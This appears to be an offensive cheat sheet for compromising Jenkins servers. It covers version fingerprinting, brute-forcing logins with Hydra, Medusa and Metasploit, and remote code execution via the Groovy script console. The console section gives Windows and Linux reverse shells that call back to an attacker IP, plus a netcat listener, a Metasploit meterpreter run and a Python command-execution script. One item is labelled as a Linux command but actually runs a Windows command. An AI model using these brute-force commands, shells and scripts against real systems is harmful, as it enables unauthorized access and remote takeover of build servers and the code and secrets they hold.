### **INTRODUCTION**

Jenkins is an open-source automation server used for continuous integration and delivery (CI/CD) in software development. It automates tasks like building, testing, and deploying software, and supports a vast range of plugins to extend its capabilities.

### **IDENTIFYING JENKINS VERSION**

1.  Checking Version on Login Page:  
    `Look at the bottom of the Jenkins login page for the version number.`
2.  Using Jenkins API:  
    `curl -s http://[JENKINS-IP]/api/json | jq .`
3.  From the System Information page:  
    After logging in, navigate to `Manage Jenkins` → `System Information`.

### **BRUTE FORCE CREDENTIALS**

1.  Brute-Forcing with Metasploit:  
    `auxiliary/scanner/http/jenkins_login`
2.  Brute-Forcing with Hydra:  
    `hydra -l admin -P /path/to/wordlist.txt [JENKINS-URL] http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Log+in:Invalid username or password" -V`
3.  Brute-Forcing with Medusa:  
    `medusa -h [JENKINS-URL] -U /path/to/usernames.txt -P /path/to/wordlist.txt -M web-form -m DIR:/j_acegi_security_check -m FORM:'/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Log+in:Invalid username or password'`

### **REMOTE CODE EXECUTION VIA SCRIPT CONSOLE**

1.  Access Script Console:  
    `http://[JENKINS-DOMAIN]:8080/script`
2.  Executing a Simple whoami:
    ```Groovy
    def cmd = 'whoami'
    def sout = new StringBuffer(), serr = new StringBuffer()
    def proc = cmd.execute()
    proc.consumeProcessOutput(sout, serr)
    proc.waitForOrKill(1000)
    println sout
    ```

3.  Executing Linux Commands:
    ```Groovy
    def cmd = "cmd.exe /c dir".execute();
    println("${cmd.text}");
    ```
    
4.  Windows Reverse Shell:
    ```Groovy
    String host="10.10.14.3";
    int port=1337;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    ```
    
5.  Linux Reverse Shell:
    ```Groovy
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    ```
    
6 . Run listener with rlwrap to make the shell more usable  
    `sudo rlwrap -cAr nc -lvnp 1337`

### **AUTOMATING EXPLOITATION WITH METASPLOIT**

```bash
# 1. Launch Metasploit
msfconsole

# 2. Load the Jenkins script console exploit
use exploit/multi/http/jenkins_script_console

# 3. Set the target IP address
set RHOSTS [TARGET-IP]

# 4. Set the Jenkins port (default is 8080)
set RPORT 8080

# 5. Set the path to the script console
set TARGETURI /script

# 6. Choose your payload (reverse shell using Meterpreter)
set PAYLOAD java/meterpreter/reverse_tcp

# 7. Set your local IP address (attacker)
set LHOST [LOCAL-IP]

# 8. Set the port to receive the reverse shell
set LPORT [LOCAL-PORT]

# 9. Run the exploit
exploit
```
### **AUTOMATING EXPLOITATION WITH PYTHON SCRIPT**

```Python
#!/usr/bin/env python3
import requests
import argparse
import re
import json


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description = 'Jenkins Admin Groovy Console exec')
parser.add_argument('url', type=str)
parser.add_argument('-u', '--user', type=str)
parser.add_argument('-p', '--password', type=str)
parser.add_argument('-c', '--command', type=str, required=True)
parser.add_argument('-C', '--cookie', type=str)
parser.add_argument('-K', '--crumb', type=str)

args = parser.parse_args()
URL = args.url
COOKIES = {}
if args.user and args.password:
    AUTH = (args.user, args.password)
else:
    AUTH = None
if args.cookie:
    COOKIES = json.loads(args.cookie)

DATA = {'script':"def proc = ['bash', '-c', '''{}'''].execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());".format(args.command)}

if args.crumb:
    DATA.update(json.loads(args.crumb))

r = requests.post(URL + '/script', data=DATA, auth=AUTH, cookies=COOKIES, verify=False)
m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
if m:
    print(m.group(1))
else:
    print('oops')
    print(r.text)
```